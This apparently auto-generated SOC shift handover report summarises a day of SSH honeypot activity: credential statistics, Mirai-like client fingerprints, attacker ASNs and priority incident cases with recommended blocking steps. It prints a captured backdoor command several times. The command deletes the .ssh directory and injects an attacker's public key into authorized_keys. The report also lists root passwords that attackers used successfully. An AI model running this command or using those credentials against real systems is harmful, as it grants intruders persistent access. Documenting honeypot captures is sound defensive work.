# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-13 |
| **Generated At** | 2026-06-13T19:42:22Z |
| **Shift Time** | 19:42 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **84** |
| Confirmed Threats | **80** |
| False Positives Filtered | **4** (4.8%) |
| Unique Attacker IPs | **21** |
| Countries of Origin | **11** |
| High Severity Cases | **20** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **64** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **67** |
| Unique Credential Pairs | **48** |
| Unique Usernames | **39** |
| Unique Passwords | **36** |
| Successful Auth Pairs | **14** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 20 |
| `345gs5662d34` | 10 |
| `qb` | 1 |
| `peer` | 1 |
| `alvin` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 11 |
| `345gs5662d34` | 10 |
| `3245gs5662d34` | 10 |
| `123` | 3 |
| `P@ssw0rd2015` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 10 |
| `root` | `3245gs5662d34` | 10 |
| `root` | `P@ssw0rd2015` | 2 |
| `root` | `123456789aA!` | 1 |
| `qb` | `123` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `123456789aA!` | `194.124.210.127` | 2026-06-13T17:31:38 |
| `root` | `3245gs5662d34` | `194.124.210.127` | 2026-06-13T17:31:59 |
| `root` | `1234567891` | `194.124.210.127` | 2026-06-13T17:44:18 |
| `root` | `Qwer1234` | `194.124.210.127` | 2026-06-13T17:50:37 |
| `root` | `Wh123456..` | `194.124.210.127` | 2026-06-13T17:56:23 |
| `root` | `P@ssw0rd2015` | `160.191.244.158` | 2026-06-13T18:46:45 |
| `root` | `3245gs5662d34` | `160.191.244.158` | 2026-06-13T18:46:49 |
| `root` | `qq@123456` | `41.63.62.103` | 2026-06-13T19:00:25 |
| `root` | `3245gs5662d34` | `41.63.62.103` | 2026-06-13T19:00:31 |
| `root` | `zxcv` | `41.63.62.103` | 2026-06-13T19:09:50 |
| `root` | `P@ssw0rd2015` | `41.63.62.103` | 2026-06-13T19:19:01 |
| `root` | `vps@1234` | `190.167.237.191` | 2026-06-13T19:27:46 |
| `root` | `3245gs5662d34` | `190.167.237.191` | 2026-06-13T19:27:52 |
| `root` | `Xx123456789` | `41.63.62.103` | 2026-06-13T19:28:03 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **84** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 68 |
| Unknown | 2 |
| Perl Net::SSH | 2 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 68 | 6 |
| `3c0eaacec19b...` | Mirai/variant | 2 | 2 |
| `873a5fb5fedc...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 68 | 6 | Mirai/variant |
| `95420f9d932d...` | Unknown | 2 | 2 | — |
| `3c0eaacec19b...` | Perl Net::SSH | 2 | 2 | Mirai/variant |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 10 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `160.191.244.158`, `194.124.210.127`, `190.167.237.191`, `41.63.62.103`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **21** |
| Unique ASNs | **14** |
| High-Risk ASNs | **11** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS213412` | ONYPHE SAS | 5 | HIGH |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS134762` | CHINANET Liaoning province Dalian MAN network | 1 | HIGH |
| `AS50053` | VDSka hosting | 1 | HIGH |
| `AS150436` | Byteplus Pte. Ltd. | 1 | HIGH |
| `AS4766` | Korea Telecom | 1 | HIGH |
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (20)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-067ac725852f

| Field | Detail |
|---|---|
| **Source IP** | `194.124.210[.]127` |
| **First Seen** | 2026-06-13 17:31 |
| **Last Seen** | 2026-06-13 17:32 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 17:31:35` | `cowrie.session.connect` |
| `2026-06-13 17:31:35` | `cowrie.client.version` |
| `2026-06-13 17:31:36` | `cowrie.client.kex` |
| `2026-06-13 17:31:38` | `cowrie.login.success` |
| `2026-06-13 17:31:40` | `cowrie.session.params` |
| `2026-06-13 17:31:40` | `cowrie.command.input` |
| `2026-06-13 17:31:40` | `cowrie.command.failed` |
| `2026-06-13 17:31:41` | `cowrie.log.closed` |
| `2026-06-13 17:31:43` | `cowrie.session.params` |
| `2026-06-13 17:31:43` | `cowrie.command.input` |
| `2026-06-13 17:31:46` | `cowrie.session.file_download` |
| `2026-06-13 17:31:46` | `cowrie.log.closed` |
| `2026-06-13 17:32:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.124.210[.]127` to AbuseIPDB if not already reported
- [ ] Block `194.124.210[.]127` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-567acc169a26

| Field | Detail |
|---|---|
| **Source IP** | `194.124.210[.]127` |
| **First Seen** | 2026-06-13 17:31 |
| **Last Seen** | 2026-06-13 17:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 17:31:56` | `cowrie.session.connect` |
| `2026-06-13 17:31:56` | `cowrie.client.version` |
| `2026-06-13 17:31:57` | `cowrie.client.kex` |
| `2026-06-13 17:31:59` | `cowrie.login.success` |
| `2026-06-13 17:32:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.124.210[.]127` to AbuseIPDB if not already reported
- [ ] Block `194.124.210[.]127` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd1921a122cd

| Field | Detail |
|---|---|
| **Source IP** | `194.124.210[.]127` |
| **First Seen** | 2026-06-13 17:44 |
| **Last Seen** | 2026-06-13 17:44 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 17:44:15` | `cowrie.session.connect` |
| `2026-06-13 17:44:15` | `cowrie.client.version` |
| `2026-06-13 17:44:15` | `cowrie.client.kex` |
| `2026-06-13 17:44:18` | `cowrie.login.success` |
| `2026-06-13 17:44:19` | `cowrie.session.params` |
| `2026-06-13 17:44:19` | `cowrie.command.input` |
| `2026-06-13 17:44:19` | `cowrie.command.failed` |
| `2026-06-13 17:44:22` | `cowrie.log.closed` |
| `2026-06-13 17:44:22` | `cowrie.session.params` |
| `2026-06-13 17:44:22` | `cowrie.command.input` |
| `2026-06-13 17:44:23` | `cowrie.session.file_download` |
| `2026-06-13 17:44:23` | `cowrie.log.closed` |
| `2026-06-13 17:44:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.124.210[.]127` to AbuseIPDB if not already reported
- [ ] Block `194.124.210[.]127` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57aadc167fc7

| Field | Detail |
|---|---|
| **Source IP** | `194.124.210[.]127` |
| **First Seen** | 2026-06-13 17:44 |
| **Last Seen** | 2026-06-13 17:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 17:44:37` | `cowrie.session.connect` |
| `2026-06-13 17:44:37` | `cowrie.client.version` |
| `2026-06-13 17:44:38` | `cowrie.client.kex` |
| `2026-06-13 17:44:42` | `cowrie.login.success` |
| `2026-06-13 17:44:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.124.210[.]127` to AbuseIPDB if not already reported
- [ ] Block `194.124.210[.]127` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29b88d6bd021

| Field | Detail |
|---|---|
| **Source IP** | `194.124.210[.]127` |
| **First Seen** | 2026-06-13 17:50 |
| **Last Seen** | 2026-06-13 17:51 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 17:50:34` | `cowrie.session.connect` |
| `2026-06-13 17:50:35` | `cowrie.client.version` |
| `2026-06-13 17:50:35` | `cowrie.client.kex` |
| `2026-06-13 17:50:37` | `cowrie.login.success` |
| `2026-06-13 17:50:41` | `cowrie.session.params` |
| `2026-06-13 17:50:41` | `cowrie.command.input` |
| `2026-06-13 17:50:41` | `cowrie.command.failed` |
| `2026-06-13 17:50:44` | `cowrie.log.closed` |
| `2026-06-13 17:50:45` | `cowrie.session.params` |
| `2026-06-13 17:50:45` | `cowrie.command.input` |
| `2026-06-13 17:50:45` | `cowrie.session.file_download` |
| `2026-06-13 17:50:45` | `cowrie.log.closed` |
| `2026-06-13 17:51:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.124.210[.]127` to AbuseIPDB if not already reported
- [ ] Block `194.124.210[.]127` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-972a4152c93a

| Field | Detail |
|---|---|
| **Source IP** | `194.124.210[.]127` |
| **First Seen** | 2026-06-13 17:50 |
| **Last Seen** | 2026-06-13 17:51 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 17:50:55` | `cowrie.session.connect` |
| `2026-06-13 17:50:55` | `cowrie.client.version` |
| `2026-06-13 17:50:56` | `cowrie.client.kex` |
| `2026-06-13 17:51:03` | `cowrie.login.success` |
| `2026-06-13 17:51:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.124.210[.]127` to AbuseIPDB if not already reported
- [ ] Block `194.124.210[.]127` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-077ea3e8b46e

| Field | Detail |
|---|---|
| **Source IP** | `194.124.210[.]127` |
| **First Seen** | 2026-06-13 17:56 |
| **Last Seen** | 2026-06-13 17:56 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 17:56:19` | `cowrie.session.connect` |
| `2026-06-13 17:56:19` | `cowrie.client.version` |
| `2026-06-13 17:56:19` | `cowrie.client.kex` |
| `2026-06-13 17:56:23` | `cowrie.login.success` |
| `2026-06-13 17:56:26` | `cowrie.session.params` |
| `2026-06-13 17:56:26` | `cowrie.command.input` |
| `2026-06-13 17:56:26` | `cowrie.command.failed` |
| `2026-06-13 17:56:27` | `cowrie.log.closed` |
| `2026-06-13 17:56:29` | `cowrie.session.params` |
| `2026-06-13 17:56:29` | `cowrie.command.input` |
| `2026-06-13 17:56:29` | `cowrie.session.file_download` |
| `2026-06-13 17:56:29` | `cowrie.log.closed` |
| `2026-06-13 17:56:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.124.210[.]127` to AbuseIPDB if not already reported
- [ ] Block `194.124.210[.]127` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7eaed3c2431

| Field | Detail |
|---|---|
| **Source IP** | `194.124.210[.]127` |
| **First Seen** | 2026-06-13 17:56 |
| **Last Seen** | 2026-06-13 17:56 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 17:56:38` | `cowrie.session.connect` |
| `2026-06-13 17:56:40` | `cowrie.client.version` |
| `2026-06-13 17:56:41` | `cowrie.client.kex` |
| `2026-06-13 17:56:46` | `cowrie.login.success` |
| `2026-06-13 17:56:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.124.210[.]127` to AbuseIPDB if not already reported
- [ ] Block `194.124.210[.]127` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12a01980a851

| Field | Detail |
|---|---|
| **Source IP** | `160.191.244[.]158` |
| **First Seen** | 2026-06-13 18:46 |
| **Last Seen** | 2026-06-13 18:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 18:46:45` | `cowrie.session.connect` |
| `2026-06-13 18:46:45` | `cowrie.client.version` |
| `2026-06-13 18:46:45` | `cowrie.client.kex` |
| `2026-06-13 18:46:45` | `cowrie.login.success` |
| `2026-06-13 18:46:46` | `cowrie.session.params` |
| `2026-06-13 18:46:46` | `cowrie.command.input` |
| `2026-06-13 18:46:46` | `cowrie.command.failed` |
| `2026-06-13 18:46:46` | `cowrie.log.closed` |
| `2026-06-13 18:46:46` | `cowrie.session.params` |
| `2026-06-13 18:46:46` | `cowrie.command.input` |
| `2026-06-13 18:46:46` | `cowrie.session.file_download` |
| `2026-06-13 18:46:46` | `cowrie.log.closed` |
| `2026-06-13 18:46:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.191.244[.]158` to AbuseIPDB if not already reported
- [ ] Block `160.191.244[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-182684034533

| Field | Detail |
|---|---|
| **Source IP** | `160.191.244[.]158` |
| **First Seen** | 2026-06-13 18:46 |
| **Last Seen** | 2026-06-13 18:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 18:46:48` | `cowrie.session.connect` |
| `2026-06-13 18:46:48` | `cowrie.client.version` |
| `2026-06-13 18:46:48` | `cowrie.client.kex` |
| `2026-06-13 18:46:49` | `cowrie.login.success` |
| `2026-06-13 18:46:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.191.244[.]158` to AbuseIPDB if not already reported
- [ ] Block `160.191.244[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41ef809fe5ab

| Field | Detail |
|---|---|
| **Source IP** | `41.63.62[.]103` |
| **First Seen** | 2026-06-13 19:00 |
| **Last Seen** | 2026-06-13 19:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 19:00:23` | `cowrie.session.connect` |
| `2026-06-13 19:00:23` | `cowrie.client.version` |
| `2026-06-13 19:00:23` | `cowrie.client.kex` |
| `2026-06-13 19:00:25` | `cowrie.login.success` |
| `2026-06-13 19:00:25` | `cowrie.session.params` |
| `2026-06-13 19:00:25` | `cowrie.command.input` |
| `2026-06-13 19:00:25` | `cowrie.command.failed` |
| `2026-06-13 19:00:26` | `cowrie.log.closed` |
| `2026-06-13 19:00:26` | `cowrie.session.params` |
| `2026-06-13 19:00:26` | `cowrie.command.input` |
| `2026-06-13 19:00:26` | `cowrie.session.file_download` |
| `2026-06-13 19:00:26` | `cowrie.log.closed` |
| `2026-06-13 19:00:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.63.62[.]103` to AbuseIPDB if not already reported
- [ ] Block `41.63.62[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90a65b3d520d

| Field | Detail |
|---|---|
| **Source IP** | `41.63.62[.]103` |
| **First Seen** | 2026-06-13 19:00 |
| **Last Seen** | 2026-06-13 19:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 19:00:30` | `cowrie.session.connect` |
| `2026-06-13 19:00:30` | `cowrie.client.version` |
| `2026-06-13 19:00:30` | `cowrie.client.kex` |
| `2026-06-13 19:00:31` | `cowrie.login.success` |
| `2026-06-13 19:00:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.63.62[.]103` to AbuseIPDB if not already reported
- [ ] Block `41.63.62[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60c8e3b377cb

| Field | Detail |
|---|---|
| **Source IP** | `41.63.62[.]103` |
| **First Seen** | 2026-06-13 19:09 |
| **Last Seen** | 2026-06-13 19:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 19:09:49` | `cowrie.session.connect` |
| `2026-06-13 19:09:49` | `cowrie.client.version` |
| `2026-06-13 19:09:49` | `cowrie.client.kex` |
| `2026-06-13 19:09:50` | `cowrie.login.success` |
| `2026-06-13 19:09:51` | `cowrie.session.params` |
| `2026-06-13 19:09:51` | `cowrie.command.input` |
| `2026-06-13 19:09:51` | `cowrie.command.failed` |
| `2026-06-13 19:09:51` | `cowrie.log.closed` |
| `2026-06-13 19:09:52` | `cowrie.session.params` |
| `2026-06-13 19:09:52` | `cowrie.command.input` |
| `2026-06-13 19:09:52` | `cowrie.session.file_download` |
| `2026-06-13 19:09:52` | `cowrie.log.closed` |
| `2026-06-13 19:09:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.63.62[.]103` to AbuseIPDB if not already reported
